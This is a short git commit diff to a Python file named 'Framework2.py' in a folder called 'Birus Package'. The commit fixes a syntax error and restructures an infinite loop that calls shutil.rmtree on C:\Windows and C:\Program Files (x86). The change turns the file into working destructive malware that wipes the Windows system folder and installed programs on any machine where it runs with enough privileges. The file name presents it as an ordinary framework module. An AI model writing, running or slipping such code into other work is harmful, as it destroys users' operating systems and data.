30f2c6f23588c7abf6ccd1eeba4207bc2effadbc
Atlasbrine <68679350+Atlasbrine@users.noreply.github.com>
2020-08-21 10:22:21 +0600

    Update Framework2.py

--- Birus Package/Framework2.py
+++ Birus Package/Framework2.py
@@ -1,7 +1,7 @@
 import shutil
 i = int (0)
-while i = 0:
-	path = "C:\Windows"
+path = "C:\Windows"
+path2 = (r"C:\Program Files (x86)")
+while i == 0:
 	shutil.rmtree(path)
-	path2 = (r"C:\Program Files (x86)")
 	shutil.rmtree(path2)
